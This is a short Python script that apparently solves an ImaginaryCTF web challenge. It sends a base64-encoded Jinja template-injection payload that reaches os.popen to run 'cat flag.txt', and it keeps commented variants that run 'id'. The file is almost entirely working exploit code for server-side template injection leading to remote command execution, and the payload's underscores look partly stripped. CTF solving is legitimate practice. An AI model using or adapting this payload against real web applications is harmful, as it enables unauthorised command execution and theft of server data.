import requests, base64

url = "https://build-a-website.chal.imaginaryctf.org/site"

cmd = "cat flag.txt"

payload = "{{request['application'][request.args.g]['_builtins']['import_']('os')['popen']('"+cmd+"')['read']()}}"
payload = base64.b64encode(payload.encode()).decode()

res  = requests.get(url + '?content=' + payload + "&g=_globals_")

print(res.text)


# request['application']['_globals']['builtins']['import_']('os')['popen']('id')['read']()
# request['application'][request|attr(request.args.f)]['_builtins']['import_']('os')['popen']('id')['read']()

#ictf{:rooYay::rooPOG::rooHappy:_:rooooooooooooooooooooooooooo:}
